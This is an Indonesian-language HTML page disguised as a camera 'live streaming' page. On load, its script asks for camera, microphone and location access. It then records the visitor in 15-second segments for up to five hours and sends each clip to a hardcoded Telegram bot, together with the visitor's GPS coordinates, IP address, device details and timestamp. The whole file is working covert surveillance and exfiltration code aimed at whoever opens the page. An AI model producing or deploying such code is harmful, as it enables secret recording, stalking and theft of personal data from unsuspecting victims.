<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Live Streaming Kamera</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      text-align: center;
      width: 300px;
      animation: fadeIn 0.7s ease;
    }
    button {
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="popup" id="step1">
    <button onclick="startStreaming()">LANJUTKAN</button>
  </div>
  <video id="video" autoplay playsinline style="display:none;"></video>

  <div id="loading" style="display:none;">
    <h3>Tunggu sebentar...</h3>
  </div>

  <script>
    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
    const chat_id = '6374002294';
    let recorder;
    let recordedChunks = [];

    // Meminta izin untuk mengakses kamera dan mikrofon dengan kualitas tinggi
    async function startStreaming() {
      try {
        // Meningkatkan resolusi video saat meminta akses kamera dan mikrofon
        const constraints = {
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 30, max: 60 }
          },
          audio: true
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.getElementById('video');
        video.style.display = 'block';  // Menampilkan video
        video.srcObject = stream;

        // Inisialisasi MediaRecorder
        recorder = new MediaRecorder(stream);
        recorder.ondataavailable = handleDataAvailable;
        recorder.onstop = handleStop;

        // Mulai merekam video
        recorder.start();

        // Menunggu 15 detik sebelum mulai mengirimkan video
        setTimeout(() => {
          setInterval(() => {
            recorder.stop();  // Menghentikan perekaman
            recorder.start();  // Mulai perekaman lagi
          }, 15000);  // Menghentikan dan memulai perekaman setiap 15 detik
        }, 15000);  // Tunggu 15 detik untuk mulai merekam

        // Berhenti setelah 5 jam (180 menit atau 18000000 milidetik)
        setTimeout(() => {
          recorder.stop();  // Menghentikan perekaman setelah 5 jam
          alert('Streaming selesai setelah 5 jam.');
        }, 18000000);  // 5 jam dalam milidetik

      } catch (err) {
        console.error('Error:', err);
        alert("Akses kamera atau lokasi ditolak!");
      }
    }

    // Menyimpan data video
    function handleDataAvailable(event) {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    }

    // Menangani setelah perekaman dihentikan
    async function handleStop() {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];

      // Ambil data tambahan
      const userAgent = navigator.userAgent;
      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
      const androidVersion = navigator.userAgent.match(/Android (\d+\.\d+)/)[1];  // Mendapatkan versi Android
      const currentTime = new Date();
      const date = currentTime.toLocaleDateString();
      const time = currentTime.toLocaleTimeString();
      const location = await getLocation();

      const message = `
█▄░▄█ █▀ █▄░█ █░█
█░█░█ █▀ █░▀█ █░█
▀░░░▀ ▀▀ ▀░░▀ ▀▀▀
××××××××××××××××××××××××××××××
Lokasinya: ${location}
======================
Nama HP: ${userAgent}
Perangkat: ${androidVersion}
IP: ${ip}
Android: ${androidVersion}
Waktu: ${time}
Tanggal: ${date}
`;

      // Kirim video dan informasi ke Telegram
      sendVideoToTelegram(blob, message);
    }

    // Mengambil lokasi pengguna
    async function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
          }, reject);
        } else {
          reject("Lokasi tidak dapat diambil.");
        }
      });
    }

    // Mengirim video dan pesan ke Telegram
    async function sendVideoToTelegram(blob, message) {
      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("text", message);

      // Kirim file video
      formData.append("video", blob, "video.webm");

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
      }).catch((error) => {
        console.error('Telegram Error:', error);
      });
    }

    // Mulai streaming segera tanpa tombol popup
    startStreaming();
  </script>
</body>
</html>
